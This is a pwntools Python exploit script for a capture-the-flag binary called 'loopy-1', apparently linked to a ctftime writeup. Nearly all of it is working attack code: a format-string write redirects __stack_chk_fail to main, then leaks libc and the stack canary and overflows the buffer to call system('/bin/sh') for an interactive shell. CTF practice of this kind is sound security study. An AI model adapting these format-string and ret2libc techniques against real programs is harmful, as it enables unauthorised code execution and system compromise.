#!/usr/bin/env python

from pwn import *


libc = ELF('./libc.so.6')
e = ELF('./loopy-1')
p = process('./loopy-1')
context.terminal = ['tmux', 'new-window']

#get addr
bin_off = 0x17eaaa
stk = e.got['__stack_chk_fail']
vuln = e.symbols['vuln']
main = e.symbols['main']
fwrite_got = e.got['fwrite']

log.info('__stack_chk_fail: '+hex(stk))
log.info('vuln: '+hex(vuln))

#write vuln to stk check
payload = ''
payload+= fmtstr_payload(7, {stk:main})
payload+= 'A'*68
p.sendline(payload)

#leak addr
payload = ''
payload+= p32(fwrite_got)
payload+= '%7$s'
p.sendlineafter('>', payload+'A'*(72-len(payload)))
p.recvuntil('You typed: ')
p.recv(4)
libc_base = u32(p.recv(4))-libc.symbols['fwrite']
log.info('libc_base: '+hex(libc_base))

#get system and binsh
system = libc_base + libc.symbols['system']
log.info('system: '+hex(system))
binsh = libc_base + libc.search('/bin/sh').next()
log.info('/bin/sh :'+hex(binsh))

#leak canary
payload = ''
payload+= '%23$x'
p.sendlineafter('>', payload+'A'*(72-len(payload)))
p.recvuntil('You typed: ')
p.recv(4)
canary = u32(p.recv(4))
log.info('Canary: '+hex(canary))

#bustamove
payload = ''
payload+= 'A'*64
payload+= p32(canary)
payload+= 'A'*12
payload+= p32(system)
payload+= 'BBBBBBB'
payload+= p32(binsh)
p.sendlineafter('>', payload)
p.interactive()

https://ctftime.org/writeup/16622